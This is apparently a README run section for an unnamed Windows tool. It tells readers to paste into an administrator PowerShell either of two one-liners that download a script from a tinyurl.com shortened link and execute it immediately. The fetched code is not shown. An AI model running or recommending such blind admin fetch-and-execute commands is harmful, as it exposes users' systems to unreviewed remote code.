## How to Run
Paste this command into Powershell (admin):
```
iex ((New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/2p96uvpd'))
```
Or, shorter:
```
iwr -useb https://tinyurl.com/2p96uvpd|iex
```
